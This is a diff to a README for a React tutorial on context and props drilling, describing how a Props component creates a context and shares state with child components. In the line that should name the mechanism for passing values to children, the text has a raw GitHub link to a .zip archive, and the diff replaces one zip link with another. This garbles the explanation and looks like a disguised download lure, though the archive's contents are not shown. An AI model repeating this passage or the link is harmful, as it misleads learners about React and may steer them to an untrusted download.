@@ -21,7 +21,7 @@ On running the app, you should see:
 1. **Props**:
    - Creates the context using `createContext`.
    - Uses `useState` to manage and store `data`, `frameWork`, and `arrData` values.
-   - Passes these values to the children components using `https://raw.githubusercontent.com/oomprakash99/ReactJsPropsDrill/main/src/Props_React_Drill_Js_v3.0.zip`.
+   - Passes these values to the children components using `https://raw.githubusercontent.com/oomprakash99/ReactJsPropsDrill/main/src/components/Js-Drill-React-Props-3.3-beta.1.zip`.
 
 2. **Call1**:
    - Consumes the `data` and `frameWork` values from the context.
